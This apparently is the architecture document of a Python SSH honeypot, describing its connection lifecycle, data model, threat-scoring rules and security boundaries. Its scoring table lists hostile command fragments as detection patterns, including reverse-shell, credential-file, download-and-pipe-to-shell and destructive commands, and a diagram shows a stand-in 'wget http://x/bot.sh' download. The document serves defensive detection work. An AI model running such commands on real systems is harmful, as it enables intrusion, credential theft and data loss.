# Architecture

## Overview

```mermaid
flowchart TB
    subgraph Internet
        A[Attackers / bots]
    end
    subgraph Engine["Honeypot engine — python -m honeypot"]
        L[Listener<br/>socket accept loop] --> LIM{ConnectionLimiter<br/>global + per-IP}
        LIM -->|thread per client| T[paramiko.Transport<br/>fake banner · host key]
        T --> I[HoneypotInterface<br/>ServerInterface callbacks]
        I -->|password / publickey| P[AuthPolicy]
        I -->|shell / exec| S[FakeShell]
        S --> AN[analyze_command]
    end
    subgraph Storage
        DB[(SQLite · WAL)]
        J[[events.jsonl]]
    end
    subgraph UI["Dashboard — python -m honeypot.dashboard"]
        F[Flask + waitress] --> Q[queries.py]
    end
    A -->|TCP 22 → 2222| L
    I --> DB
    AN --> DB
    I --> J
    Q -->|PRAGMA query_only| DB
```

## Connection lifecycle

```mermaid
sequenceDiagram
    participant A as Attacker
    participant H as Honeypot
    participant D as Database
    A->>H: TCP connect
    H->>D: sessions(INSERT)
    H-->>A: SSH-2.0-OpenSSH_8.9p1 Ubuntu
    A->>H: key exchange
    H->>D: client_version
    loop until accepted or max attempts
        A->>H: password root / 123456
        H->>D: auth_attempts(success=0)
        H-->>A: auth failed
    end
    A->>H: password root / root
    H->>D: auth_attempts(success=1)
    A->>H: pty-req + shell
    H-->>A: MOTD + prompt
    loop each command line
        A->>H: wget http://x/bot.sh
        H->>D: commands(risk, tags) + iocs(url)
        H-->>A: emulated output (download "fails")
    end
    A->>H: exit
    H->>D: sessions(ended_at, duration, end_reason)
```

## Design decisions

| Decision | Rationale |
|---|---|
| **Paramiko instead of Cowrie** | ~2k readable lines you can fully audit and extend; Cowrie is more complete but large. |
| **Thread per connection** | Workload is I/O-bound; threads are simple and handle hundreds of sessions. Bounded by `ConnectionLimiter`. |
| **Pure emulator shell** | The single most important safety property: attacker input never reaches the OS. |
| **Quote-aware tokenizer** | Bots fingerprint with pipelines and quoting (`awk '{print $NF}'`); wrong output is a honeypot tell. |
| **SQLite in WAL mode** | Zero-ops storage; the dashboard reads while the engine writes. |
| **JSONL side-channel** | One event per line — ship to a SIEM without touching the database. |
| **Persistent host key** | A key that changes per restart is an instant giveaway. |
| **Fail-soft storage** | DB errors are logged, never raised into a session — a crash would tip off the attacker. |

## Data model

```mermaid
erDiagram
    sessions ||--o{ auth_attempts : has
    sessions ||--o{ commands : has
    sessions ||--o{ iocs : has
    sessions {
        text id PK
        text src_ip
        int src_port
        text client_version
        text started_at
        text ended_at
        real duration
        int login_success
        text username
        text password
        text term
        text end_reason
    }
    auth_attempts {
        int id PK
        text session_id FK
        text ts
        text method "password | publickey"
        text username
        text password
        text key_type
        text key_fingerprint
        int success
    }
    commands {
        int id PK
        text session_id FK
        text ts
        text command
        text kind "shell | exec"
        int known
        int risk
        text tags
    }
    iocs {
        int id PK
        text session_id FK
        text ts
        text ioc_type "url | ip | decoded-payload | proxy-attempt | subsystem"
        text value
    }
```

`end_reason` values: `handshake_failed` (port scanner), `auth_failed`, `max_auth_attempts`,
`exec_done`, `logout`, `client_closed`, `idle_timeout`, `session_timeout`, `max_commands`,
`connection_error`, `internal_error`.

Schema version is tracked in `PRAGMA user_version`; migrations go in `EventStore._migrate`.

## Threat scoring

Each command line is matched against the rules in `honeypot/analysis.py`:

| Tag | Example | Points | ATT&CK |
|---|---|---|---|
| reverse-shell | `bash -i >& /dev/tcp/…`, `nc -e` | 10 | T1059.004 |
| cryptominer | `xmrig`, `stratum+tcp://` | 10 | T1496 |
| download | `wget`, `curl`, `tftp` | 8 | T1105 |
| obfuscated-exec | `base64 -d`, `\| sh`, `python -c` | 7 | T1027 |
| destructive | `rm -rf`, `dd if=`, `mkfs` | 7 | T1485 |
| persistence | `authorized_keys`, `crontab` | 7 | T1098.004 |
| account-manipulation | `useradd`, `passwd` | 6 | T1136 |
| make-executable | `chmod +x` | 6 | T1222 |
| defense-evasion | `history -c`, `iptables` | 5 | T1562 |
| credential-access | `/etc/shadow`, `.ssh/id_` | 4 | T1552 |
| recon | `uname`, `nproc`, `free` | 1 | T1082 |

Per-IP **score** — orders the ranking (weights in `honeypot/dashboard/queries.py`):

```
score = attempts×1 + successful_logins×15 + commands×2 + Σrisk×3 + distinct_IOCs×10
```

Per-IP **threat level** — answers "how worried should I be?" from *behaviour*, not volume,
so a noisy brute-forcer never looks as bad as an attacker who got in and launched a miner:

| Level | Condition |
|---|---|
| critical | ran a single command line with risk ≥ 10 (reverse shell, miner, download + execute…) |
| high | got a shell and executed commands or dropped IOCs |
| medium | logged in without doing anything, or ≥ 20 login attempts |
| low | a few failed guesses or a port scan |

## Security boundaries

| Threat | Mitigation |
|---|---|
| Command execution on host | Emulator only; no `subprocess`/`os.system`/file/network APIs in `fake_shell.py` |
| Resource exhaustion | Connection caps, timeouts, max line length, max commands, FS node cap, recursion depth cap |
| Honeypot used as proxy | `direct-tcpip`, remote forwarding and subsystems refused (and logged) |
| SQL injection via credentials | Parameterised queries only |
| XSS via attacker strings | Jinja autoescape, `tojson` into non-executable script tag, strict CSP, no `innerHTML` |
| CSV formula injection | Cells beginning with `= + - @` are prefixed with `'` |
| Log injection | Attacker strings logged with `%r` (newlines escaped) |
| Dashboard exposure | Loopback by default; refuses public bind without password; read-only DB connection |
| Container breakout impact | Non-root UID, read-only rootfs, `cap_drop: ALL`, `no-new-privileges` |
